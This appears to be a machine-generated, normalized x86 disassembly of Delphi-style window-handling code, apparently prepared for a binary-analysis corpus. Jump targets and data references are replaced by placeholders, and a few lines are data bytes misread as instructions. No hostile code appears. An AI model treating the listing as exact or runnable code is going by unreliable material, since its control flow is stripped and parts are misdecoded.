sub edx eax
mov eax esi
call sub_44ae6c
mov eax ebx
call sub_433374
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_4333b8
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_4333b8
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_44ae6c
mov eax ebx
call sub_4333b8
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_44b748
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_44ae6c
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_44ae6c
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_44afbc
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_44afbc
sub_44b7ec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44b748
mov ecx edi
mov edx esi
mov eax ebx
call sub_439c7c
pop edi
pop esi
pop ebx
retn
sub_44b814
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_44b87e
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43875c
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b885
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_44b885
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_44b8bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44b464
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b8c4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_44b8c4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44b4e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_44b938
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4333b8
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_4224d0
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_433374
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_4224d0
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_412454
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_4361dc
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44b9a8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44ba09
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_40327c
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4394ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ba10
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_44ba38
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44bb9c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_44bb7c
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_403038
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_4033fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bb83
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_44bb44
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_413620
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403040
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
call sub_403864
sub_44bbc4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_4032ec
and [ ebx + 0x2f4 ] 0xdf
sub_44bbfc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44b208
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_4330e0
xor edx edx
mov eax ebx
call sub_433104
mov edx 0x140
mov eax ebx
call sub_43312c
mov edx 0xf0
mov eax ebx
call sub_433150
mov dl 0x1
mov eax [ r-xdata ]
call sub_421a64
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_44c518
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d474
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_43254c
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_403038
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_44c87c
xor edx edx
mov eax ebx
call sub_433b34
xor edx edx
mov eax ebx
call sub_433a9c
mov dl 0x1
mov eax ebx
call sub_43a2b0
mov edx ebx
mov eax [ rw-data ]
call sub_450ee0
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_44bd75
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_419dac
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_4139fc
xor edx edx
mov eax ebx
call sub_416828
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_44fd88
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_44bde0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403464
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_44beaa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44e704
mov eax [ ebp - 0x4 ]
call sub_43a474
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_450f18
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_4030f0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_4030f0
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40cb14
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44b280
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44beb1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_44bec4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push j_sub_403578#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44c87c
sub_44bf0a
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_4032ec
test al al
jne r-xdata
call sub_4038e0
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_40388c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44c87c
sub_44bf40
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_44bf81
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_44bfa0
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_435a44
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_4032ec
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44e248
sub_44bfdc
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_432e40
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_413704
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_44d640
mov edx esi
mov eax ebp
call sub_4139fc
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_44d618
mov edx esi
mov eax edi
call sub_44d640
jmp r-xdata
xor edx edx
mov eax edi
call sub_44d5f4
sub_44c0e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_436a08
xor edx edx
push ebp
push sub_44c33e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_436164
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43338c
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4333d0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_44c470
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_434b3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c345
mov eax [ ebp - 0x4 ]
call sub_436a10
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44b748
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_439c34
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44b748
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_439c34
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_41cd38
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_41cd40
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_44c34d
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4374b0
push 0x0
push 0x0
push ebx
push sub_44c454
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_44c420
push ebx
push sub_44c438
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_44c3ff
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_416f20
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_433a9c
sub_44c48b
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44b748
mov ecx edi
mov edx esi
mov eax ebx
call sub_439c34
mov eax ebx
call sub_44c574
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_41cddc
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_41cdf8
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4333b8
mov ebp eax
push edi
push esi
mov eax ebx
call sub_433374
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_44c81c
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_44c84c
sub_44c518
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_43a170
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_43a474
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_44e878
push eax
push 0x1
push 0x80
mov eax ebx
call sub_43a170
push eax
call SendMessageA
pop ebx
retn
sub_44c5ac
push ebx
mov ebx eax
mov eax ebx
call sub_44d4c8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_44c640
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43a170
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_43a238
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_43a170
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_43a170
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_44c6c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_43a714
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_41a130
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41a104
mov edi eax
mov eax edi
mov si 0xfff1
call sub_4032ec
test al al
jne r-xdata
sub_44c734
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_403038
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44c760
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax ebp
call sub_436ea0
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_41a130
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_43a75c
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_41a104
mov si 0xfff1
call sub_4032ec
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_41a140
jmp r-xdata
sub_44c7f4
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_433b58
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_434b3c
sub_44c81c
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43338c
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_44c84c
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_4333d0
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_44c87c
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_433890
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_44d9b4
pop esi
pop ebx
retn
sub_44c8c0
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_44c919
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c920
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
sub_44c928
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_433844
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_4376c8
mov eax ebx
call sub_437864
sub_44c960
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_419f7c
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_44c9a0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_437b84
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_4032ec
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_4032ec
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
